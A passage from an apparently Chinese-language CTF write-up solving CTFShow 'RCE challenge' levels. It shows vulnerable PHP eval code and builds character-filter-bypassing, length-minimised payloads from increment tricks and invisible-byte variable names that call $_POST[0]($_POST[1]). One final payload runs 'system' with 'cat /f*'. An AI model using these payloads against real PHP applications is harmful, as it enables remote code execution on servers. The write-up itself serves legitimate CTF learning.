class=\"token punctuation\">;</span><span class=\"token comment\">//O  ++$_是先进行自增，而后取值，所以这里$_1就是O</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token constant\">_</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//_  首先获取_</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">.=</span><span class=\"token operator\">++</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//_P  通过自增获取P </span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">.=</span><span class=\"token variable\">$_1</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//_PO  获取O</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//Q </span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//R</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">.=</span><span class=\"token operator\">++</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//_POS 通过自增获取S</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">.=</span><span class=\"token operator\">++</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//_POST  通过自增获取T</span>\n<span class=\"token variable\">$$__</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$$__</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//$_POST[0]($_POST[1])</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>接下来将代码放入一行</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token operator\">/</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token constant\">_</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_1</span><span class=\"token operator\">=</span><span class=\"token operator\">++</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token constant\">_</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">.=</span><span class=\"token operator\">++</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">.=</span><span class=\"token variable\">$_1</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">.=</span><span class=\"token operator\">++</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">.=</span><span class=\"token operator\">++</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$$__</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$$__</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141557566.png\" alt=\"在这里插入图片描述\"><br>可以看到这里是103，小于105，接下来进行URL编码，然后去环境里尝试一下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141557533.png\" alt=\"在这里插入图片描述\"><br>成功执行<code>ls /</code>命令<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141557587.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"CTFShow-RCE挑战4\"><a href=\"#CTFShow-RCE挑战4\" class=\"headerlink\" title=\"CTFShow[RCE挑战4]\"></a>CTFShow[RCE挑战4]</h2><p>源码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctf_show'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$ctfshow</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctf_show'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ctfshow</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ctfshow</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">84</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[a-zA-Z1-9!'@#%^&amp;*:&#123;&#125;\\-&lt;\\?>\\\"|`~\\\\\\\\]/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$ctfshow</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ctfshow</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Are you hacking me AGAIN?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>可以看到本题进一步限制了长度，要求长度小于84位，然后这里的话需要说一些缩短长度的方法。<br>首先就是我们之前得到字符<code>N</code>是这样的,<code>$_=(0/0)._;$_=$_[0];</code>，然后这个的话我们其实是可以进行一个缩短的，我们可以写成这个样子<code>$_0=(_/_._)[0];</code>,这个<code>(_/_._)</code>就可以直接得到<code>NAN</code>，然后我们再加上一个<code>[0]</code>，就可以缩短长度<br>然后其他就是对自增这些进行一下缩短，我构造的payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$_0</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token constant\">_</span><span class=\"token operator\">/</span><span class=\"token constant\">_</span><span class=\"token operator\">.</span><span class=\"token constant\">_</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//NAN</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token operator\">++</span><span class=\"token variable\">$_0</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//O</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token constant\">_</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//_</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">.=</span><span class=\"token operator\">++</span><span class=\"token variable\">$_</span><span class=\"token operator\">.</span><span class=\"token variable\">$_0</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//_P</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//Q</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//R</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">.=</span><span class=\"token operator\">++</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//_POS</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">.=</span><span class=\"token operator\">++</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//_POST</span>\n<span class=\"token variable\">$$__</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$$__</span><span class=\"token punctuation\">[</span><span class=\"token constant\">_</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//$_POST[0]($_POST[_])</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>可是这个时候当我把他放到一行中，我发现它的长度是<code>91</code>，还是大于<code>84</code>，因此这个是不可用的，这个时候看到变量名<code>$_0</code>和<code>$__</code>占了两个单位长度，如果我们可以用一个字符来表示它，是不是就可以成功缩短长度呢，然后这个时候就考虑到可以使用不可见字符<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141557591.png\" alt=\"在这里插入图片描述\"><br>然后我们在URL编码表中随便找两个，我这里就用<code>%DE</code>和<code>%DF</code>了，然后分别对变量名进行一个替换</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span><span class=\"token class-name type-declaration\">php_</span>\n$<span class=\"token operator\">%</span><span class=\"token constant\">DF</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token constant\">_</span><span class=\"token operator\">/</span><span class=\"token constant\">_</span><span class=\"token operator\">.</span><span class=\"token constant\">_</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//NAN</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token operator\">++</span>$<span class=\"token operator\">%</span><span class=\"token constant\">DF</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//O</span>\n$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token operator\">=</span><span class=\"token constant\">_</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//_</span>\n$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token operator\">.=</span><span class=\"token operator\">++</span><span class=\"token variable\">$_</span><span class=\"token operator\">.</span>$<span class=\"token operator\">%</span><span class=\"token constant\">DF</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//_P</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//Q</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//R</span>\n$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token operator\">.=</span><span class=\"token operator\">++</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//_POS</span>\n$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token operator\">.=</span><span class=\"token operator\">++</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//_POST</span>\n$$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span>$$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token punctuation\">[</span><span class=\"token constant\">_</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//$_POST[0]($_POST[_])</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>然后接下来写到一行中</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">$<span class=\"token operator\">%</span><span class=\"token constant\">DF</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token constant\">_</span><span class=\"token operator\">/</span><span class=\"token constant\">_</span><span class=\"token operator\">.</span><span class=\"token constant\">_</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token operator\">++</span>$<span class=\"token operator\">%</span><span class=\"token constant\">DF</span><span class=\"token punctuation\">;</span>$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token operator\">=</span><span class=\"token constant\">_</span><span class=\"token punctuation\">;</span>$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token operator\">.=</span><span class=\"token operator\">++</span><span class=\"token variable\">$_</span><span class=\"token operator\">.</span>$<span class=\"token operator\">%</span><span class=\"token constant\">DF</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token operator\">.=</span><span class=\"token operator\">++</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token operator\">.=</span><span class=\"token operator\">++</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>$$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span>$$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token punctuation\">[</span><span class=\"token constant\">_</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>因为涉及到不可见字符，然后它是URL编码过的，所以我们这里不能使用整体编码，需要单独对部分内容进行URL编码，不过这里需要编码的也就是<code>++</code>，对<code>++</code>URL编码即可，因此最终payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">POST</span>：\n$<span class=\"token operator\">%</span><span class=\"token constant\">DF</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token constant\">_</span><span class=\"token operator\">/</span><span class=\"token constant\">_</span><span class=\"token operator\">.</span><span class=\"token constant\">_</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B$<span class=\"token operator\">%</span><span class=\"token constant\">DF</span><span class=\"token punctuation\">;</span>$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token operator\">=</span><span class=\"token constant\">_</span><span class=\"token punctuation\">;</span>$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token operator\">.=</span><span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token variable\">$_</span><span class=\"token operator\">.</span>$<span class=\"token operator\">%</span><span class=\"token constant\">DF</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token punctuation\">;</span>$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token operator\">.=</span><span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token operator\">.=</span><span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>$$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span>$$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token punctuation\">[</span><span class=\"token constant\">_</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span><span class=\"token number\">0</span><span class=\"token operator\">=</span>system<span class=\"token operator\">&amp;</span><span class=\"token constant\">_</span><span class=\"token operator\">=</span>cat <span class=\"token operator\">/</span>f<span class=\"token operator\">*</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141557616.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"CTFShow-RCE挑战5\"><a href=\"#CTFShow-RCE挑战5\" class=\"headerlink\" title=\"CTFShow[RCE挑战5]\"></a>CTFShow[RCE挑战5]</h2><p>源码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctf_show'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$ctfshow</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctf_show'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ctfshow</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ctfshow</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">73</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[a-zA-Z0-9!'@#%^&amp;*:&#123;&#125;\\-&lt;\\?>\\\"|`~\\\\\\\\]/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$ctfshow</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ctfshow</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Are you hacking me AGAIN?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话将数字全ban了，同时要求字符串长度小于<code>73</code><br>然后这里的话根本没思路，参考过官方wp后，得知当<code>gettext</code>拓展开启时，<code>_()</code>就相当于<code>gettext()</code>，可以获取其中的内容，所以我们这里可以通过这种方式获取到字符<code>N</code>，然后我们构造的payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token function\">_</span><span class=\"token punctuation\">(</span>a<span class=\"token operator\">/</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//N</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token operator\">++</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//O</span>\n<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token constant\">_</span><span class=\"token operator\">.</span><span class=\"token operator\">++</span><span class=\"token variable\">$a</span><span class=\"token operator\">.</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//_PO</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//Q</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//R</span>\n<span class=\"token variable\">$b</span><span class=\"token operator\">.=</span><span class=\"token operator\">++</span><span class=\"token variable\">$a</span><span class=\"token operator\">.</span><span class=\"token operator\">++</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//_POST</span>\n<span class=\"token variable\">$$b</span><span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$$b</span><span class=\"token punctuation\">[</span><span class=\"token constant\">_</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//$_POST[a]($_POST[_])</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>接下来用不可见字符分别替换<code>a</code>和<code>b</code>，然后放至一行之中，得到</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token operator\">=</span><span class=\"token function\">_</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token operator\">/</span><span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token operator\">++</span>$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token punctuation\">;</span>$<span class=\"token operator\">%</span><span class=\"token constant\">DF</span><span class=\"token operator\">=</span><span class=\"token constant\">_</span><span class=\"token operator\">.</span><span class=\"token operator\">++</span>$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token operator\">.</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>$<span class=\"token operator\">%</span><span class=\"token constant\">DF</span><span class=\"token operator\">.=</span><span class=\"token operator\">++</span>$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token operator\">.</span><span class=\"token operator\">++</span>$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token punctuation\">;</span>$$<span class=\"token operator\">%</span><span class=\"token constant\">DF</span><span class=\"token punctuation\">[</span><span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span>$$<span class=\"token operator\">%</span><span class=\"token constant\">DF</span><span class=\"token punctuation\">[</span><span class=\"token constant\">_</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>再对<code>++</code>进行URL编码，得到</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token operator\">=</span><span class=\"token function\">_</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token operator\">/</span><span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token punctuation\">;</span>$<span class=\"token operator\">%</span><span class=\"token constant\">DF</span><span class=\"token operator\">=</span><span class=\"token constant\">_</span><span class=\"token operator\">.</span><span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token operator\">.</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token punctuation\">;</span>$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token punctuation\">;</span>$<span class=\"token operator\">%</span><span class=\"token constant\">DF</span><span class=\"token operator\">.=</span><span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token operator\">.</span><span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B$<span class=\"token operator\">%</span><span class=\"token constant\">DE</span><span class=\"token 